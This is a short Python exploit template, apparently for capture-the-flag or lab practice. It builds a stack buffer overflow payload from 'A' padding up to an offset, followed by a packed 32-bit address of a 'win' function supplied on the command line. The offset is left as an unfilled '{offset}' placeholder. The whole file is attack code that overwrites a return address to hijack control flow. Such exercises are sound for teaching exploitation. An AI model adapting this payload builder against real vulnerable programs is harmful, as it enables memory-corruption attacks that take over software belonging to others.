#!/usr/bin/env python3
import sys, struct

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <win_addr_hex>")
    sys.exit(1)

win = int(sys.argv[1], 16)
OFFSET = {offset}

payload = b"A" * OFFSET
payload += struct.pack("<I", win)

sys.stdout.buffer.write(payload)
